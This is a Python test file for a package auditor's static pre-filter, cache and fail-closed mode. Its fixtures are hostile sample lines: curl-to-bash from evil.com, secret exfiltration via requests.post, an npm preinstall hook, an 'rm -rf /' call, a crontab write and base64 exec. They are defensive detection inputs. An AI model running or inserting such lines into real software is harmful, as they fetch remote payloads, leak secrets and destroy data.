"""Tests for the AI auditor: static pre-filter, content-based cache, fail-closed mode."""
import os
import tempfile
import shutil

import pytest

# Patch out the OpenAI import so tests don't need an API key or real client
from unittest.mock import patch, MagicMock

# Must patch env BEFORE importing AIAuditor so the constructor doesn't try to
# connect to a real provider.
with patch.dict(os.environ, {"AI_PROVIDER": "grok"}, clear=False):
    from talkdoc_secure_pm.auditor.ai_agent import AIAuditor, _SUSPICIOUS_PATTERNS


@pytest.fixture
def auditor():
    """AIAuditor with no API key configured (fail-closed mode)."""
    with patch.dict(os.environ, {"AI_PROVIDER": "grok", "XAI_API_KEY": ""}, clear=False):
        a = AIAuditor()
        # Force no-client mode
        a.client = None
        a.model = None
    return a


@pytest.fixture
def tmp_pkg(tmp_path):
    """Helper: create a fake extracted package directory with given files."""
    def _create(files: dict[str, str]):
        for name, content in files.items():
            p = tmp_path / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content)
        return str(tmp_path)
    return _create


# ---------------------------------------------------------------------------
# Static pre-filter tests
# ---------------------------------------------------------------------------

class TestStaticPrefilter:
    def test_clean_code_passes(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "from setuptools import setup\nsetup(name='safe')\n"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is True
        assert reason == ""

    def test_base64_eval_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "eval( base64.b64decode('abc'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "base64 eval" in reason

    def test_base64_exec_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"hook.py": "exec(base64.b64decode(payload))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "base64 exec" in reason

    def test_env_exfiltration_rejected(self, auditor, tmp_pkg):
        code = "token = os.environ['SECRET']; requests.post('https://evil.com', data=token)"
        extract_dir = tmp_pkg({"leak.py": code})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "exfiltration" in reason.lower()

    def test_pipe_to_shell_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"install.sh": "curl https://evil.com/payload | bash"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "pipe to shell" in reason

    def test_non_critical_extension_ignored(self, auditor, tmp_pkg):
        # .txt files are NOT scanned, even if they contain suspicious content
        extract_dir = tmp_pkg({"README.txt": "eval( base64.b64decode('pwned'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is True

    def test_subprocess_curl_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "subprocess.run(['curl', 'https://evil.com'])"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "shell/curl" in reason

    # --- New pattern tests ---

    def test_eval_compile_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "eval(compile(open('payload').read(), '<string>', 'exec'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "eval(compile" in reason

    def test_dynamic_import_os_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"hook.py": "__import__('os').system('rm -rf /')"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "dynamic import" in reason

    def test_os_system_curl_rejected(self, auditor, tmp_pkg):
        # This may match "pipe to shell" or "os.system" pattern — both are valid rejections
        extract_dir = tmp_pkg({"setup.py": "os.system('curl https://evil.com/payload | bash')"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False

    def test_os_system_wget_rejected(self, auditor, tmp_pkg):
        """os.system with wget should be caught by the os.system pattern."""
        extract_dir = tmp_pkg({"setup.py": "os.system('wget https://evil.com/backdoor')"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "os.system" in reason

    def test_npm_preinstall_script_rejected(self, auditor, tmp_pkg):
        # May match "pipe to shell" or "lifecycle script" — both are valid rejections
        extract_dir = tmp_pkg({
            "package.json": '{"preinstall": "curl https://evil.com | bash"}'
        })
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False

    def test_npm_postinstall_python_rejected(self, auditor, tmp_pkg):
        """npm postinstall running python should be caught by lifecycle pattern."""
        extract_dir = tmp_pkg({
            "package.json": '"postinstall": "python -c import_os"'
        })
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False

    def test_sensitive_file_write_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "open('/etc/crontab', 'w').write('* * * * * evil')"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "sensitive system file" in reason

    def test_ctypes_loading_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"loader.py": "lib = ctypes.CDLL('./malicious.so')"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "ctypes" in reason

    def test_typescript_files_scanned(self, auditor, tmp_pkg):
        """Ensure .ts files are included in the static prefilter scan."""
        extract_dir = tmp_pkg({"malicious.ts": "eval( base64.decode('abc'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        # .ts files should be scanned — this has base64 eval pattern
        # Note: pattern is eval\s*\(\s*base64, this should match
        extract_dir2 = tmp_pkg({"malicious.ts": "eval( base64.b64decode('abc'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir2)
        assert is_clean is False

    def test_setup_cfg_scanned(self, auditor, tmp_pkg):
        """Ensure setup.cfg is included in scanned files."""
        extract_dir = tmp_pkg({"setup.cfg": "eval( base64.b64decode('abc'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False

    def test_pyproject_toml_scanned(self, auditor, tmp_pkg):
        """Ensure pyproject.toml is included in scanned files."""
        extract_dir = tmp_pkg({"pyproject.toml": "eval( base64.b64decode('abc'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False


# ---------------------------------------------------------------------------
# Content-based cache tests
# ---------------------------------------------------------------------------

class TestCacheContentBased:
    def test_same_content_same_result(self, auditor, tmp_pkg):
        """Two calls with identical file content → second is a cache hit."""
        extract_dir = tmp_pkg({"setup.py": "print('hello')"})
        r1 = auditor.audit_package_source("testpkg", extract_dir)
        r2 = auditor.audit_package_source("testpkg", extract_dir)
        assert r1 == r2
        # Cache should have exactly 1 entry
        assert len(auditor._cache) == 1

    def test_different_content_different_key(self, auditor, tmp_path):
        """Two versions with different content produce separate cache entries."""
        # Version A
        dir_a = tmp_path / "a"
        dir_a.mkdir()
        (dir_a / "setup.py").write_text("version_a = 1")
        auditor.audit_package_source("pkg", str(dir_a))

        # Version B
        dir_b = tmp_path / "b"
        dir_b.mkdir()
        (dir_b / "setup.py").write_text("version_b = 2")
        auditor.audit_package_source("pkg", str(dir_b))

        assert len(auditor._cache) == 2


# ---------------------------------------------------------------------------
# Fail-closed mode tests (no API key = REJECT)
# ---------------------------------------------------------------------------

class TestFailClosedMode:
    def test_no_client_rejects_package(self, auditor, tmp_pkg):
        """When no AI client is configured, audit returns False (fail-closed)."""
        extract_dir = tmp_pkg({"setup.py": "setup(name='ok')"})
        result = auditor.audit_package_source("fakepkg", extract_dir)
        assert result is False

    def test_static_prefilter_still_rejects(self, auditor, tmp_pkg):
        """Static prefilter rejects before fail-closed even triggers."""
        extract_dir = tmp_pkg({"setup.py": "exec(base64.b64decode('evil'))"})
        result = auditor.audit_package_source("evilpkg", extract_dir)
        assert result is False

    def test_cache_stores_rejection(self, auditor, tmp_pkg):
        """Fail-closed rejection is cached."""
        extract_dir = tmp_pkg({"setup.py": "setup(name='ok')"})
        auditor.audit_package_source("pkg", extract_dir)
        assert len(auditor._cache) == 1
        # The cached value should be False
        assert list(auditor._cache.values())[0] is False


# ---------------------------------------------------------------------------
# SHA-256 cache key test
# ---------------------------------------------------------------------------

class TestCacheUsesSHA256:
    def test_cache_key_uses_sha256(self, auditor, tmp_pkg):
        """Cache keys should use SHA-256 hashes (64 hex chars), not MD5 (32 hex chars)."""
        extract_dir = tmp_pkg({"setup.py": "print('test')"})
        auditor.audit_package_source("testpkg", extract_dir)
        key = list(auditor._cache.keys())[0]
        # Format: "testpkg:{sha256_hex}"
        hash_part = key.split(":")[1]
        assert len(hash_part) == 64  # SHA-256 = 64 hex chars (MD5 = 32)
